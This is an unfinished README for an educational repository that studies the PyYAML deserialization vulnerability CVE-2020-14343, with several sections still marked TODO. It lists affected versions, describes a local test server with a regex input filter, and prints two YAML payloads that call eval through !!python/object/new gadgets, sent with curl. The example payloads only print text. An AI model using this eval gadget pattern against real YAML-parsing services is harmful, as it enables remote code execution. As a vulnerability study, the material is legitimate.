=====================
pyyaml-CVE-2020-14343
=====================
Experimenting with the PyYAML vulnerability `CVE-2020-14343`_ which ... TODO

`:warning:`

  **Disclaimer**

  This repository is for educational and informational purposes 
  only. The author, raul23, assumes no responsibility for the use 
  of this repository, code or any informaton contained therein. 
  The user is solely responsible for any action he/she takes with 
  this repository, code and information contained in it.

  Do not abuse this material. Be responsible.

.. contents:: **Contents**
   :depth: 3
   :local:
   :backlinks: top

Testing environment
===================
- **Execution platform:** macOS with `conda`_ (environment manager)
- **Python prerequisites:**

  - `pyyaml`_: multiple versions of PyYAML were tested
  
    - ``pyyaml`` 3.13 (Jul 5, 2018) - vulnerable
    - ``pyyaml`` 5.1 (Mar 13, 2019) - vulnerable
    - ``pyyaml`` 5.3 (Jan 6, 2020) - vulnerable
    - ``pyyaml`` 5.4 (Jan 19, 2021) - not vulnerable
    
    `:information_source:`

      The vulnerability `CVE-2020-14343`_ was fixed in PyYAML version 5.4 [BUG]_
      
  - `flask`_ (OPTIONAL): for building a simple server that will read a payload sent 
    as a file containing the risky *yaml* syntax. If you don't have *flask*, then
    a simple web server implemented with built-in Python modules will be used.
    
    `:star:`
     
      The version choosen for ``flask`` is not that important. Just get the
      latest (v1.1.2) or if you already had installed it, the version you have 
      should be good enough for the tests. What is important is the version of 
      ``pyyaml``

Code
====
The code used by the `experiments`_ consists in a simple Python `web server`_ and
`payloads`_ as ``txt`` files:

.. code-block:: terminal

   server.py
   payload01.txt
   payload02.txt
   payload03.txt
   payload04.txt

Web server
----------
The Python code for the server is the `server.py`_ script which consists in two
simple web servers:

1. A web server implemented with built-in Python modules. It is used if the
   user doesn't have the ``flask`` module installed
2. Flask web server

However, both servers share some common features such as:

- **input sanitation:** a basic regex ``^[\n --/-\]a-}]*$`` that checks the 
  input (``txt`` payload) received by the client. The regex doesn't match 
  any string that has one of the following special characters:
  
  - ``.`` (Full stop; period)
  - ``^`` (Circumflex)
  - ``_`` (Underscore)
  - ````` (Backtick)
  - ``~``	(Tilde)
  
- 

`:information_source:`

  The flask server code is based from a note published @ hackmd.io by *harrier-lcc* [HAR]_

.. fixed: ^[\n --\/-\]a-}]*$

Payloads
--------
The payload is sent to the server as a ``txt`` file based on the 
*yaml* syntax via the ``curl`` command:

.. code-block:: terminal

   $ curl -F file=@payload{NUMBER}.txt http://0.0.0.0:8080
   
where ``payload{NUMBER}.txt`` is one of the following payloads:

- ``payload01.txt``:

  .. code-block:: terminal
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('test') ]
       
- ``payload02.txt``:

  .. code-block:: terminal
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('invalid_syntax') ]

`:information_source:`

  The payloads are based from a note published @ hackmd.io by *harrier-lcc* [HAR]_

How to use the code
-------------------
Get help about the ``server.py`` script with the ``-h`` flag:

.. code-block:: terminal

   $ python server.py -h
   usage: server.py [-h] [-v {3.13,5.1,5.3,5.4}]

   TODO

   optional arguments:
     -h, --help            show this help message and exit
     -v {3.13,5.1,5.3,5.4}, --yaml-version {3.13,5.1,5.3,5.4}
                           TODO (default: None)

|

Run the server in a terminal using a specific PyYAML version:

.. code-block:: terminal

   $ python server.py -v 3.13
   
   
`:information_source:`

  The server will use the 3.13 PyYAML version which is vulnerable to the
  the RCE exploit.

Experiments
===========
The following experiments consist in running a `simple
web server`_ that will read a payload sent
via the ``curl`` command. Also, each experiment is
associated to a specific version of ``pyyaml``.

Experiment 1: ``pyyaml`` 3.13
-----------------------------
Experiment 2: ``pyyaml`` 5.1
----------------------------
Experiment 3: ``pyyaml`` 5.3
----------------------------
Experiment 4: ``pyyaml`` 5.4
----------------------------

.. 
 Part II: More experiments
 =========================
 The following experiments consist in testing only ``pyyaml`` version 5.3 which 
 is affected by `CVE-2020-14343`_. The code used for each of the following experiments
 is different unlike the experiments in Part I which all share a common code (server and
 payloads).

References
==========
.. [BUG] “Bug 1860466 – (CVE-2020-14343) CVE-2020-14343 PyYAML: Incomplete Fix for CVE-2020-1747.” 
   *Redhat.Com*, https://bugzilla.redhat.com/show_bug.cgi?id=1860466. Accessed 30 June 2021.

.. [HAR] “Uiuctf 2020 - HackMD.” *Hackmd.Io*, https://hackmd.io/@harrier/uiuctf20. 
   Accessed 30 June 2021.

.. URLs
.. _conda: https://docs.conda.io/projects/conda/en/latest/user-guide/getting-started.html
.. _CVE-2020-14343: https://access.redhat.com/security/cve/cve-2020-14343
.. _flask: https://flask.palletsprojects.com/
.. _pyyaml: https://pypi.org/project/PyYAML/

.. URLs within project
.. _server.py: ./README.rst

.. URLs internal
.. _experiments: #experiments
.. _payloads: #payloads
.. _simple web server: #web-server
.. _web server: #web-server
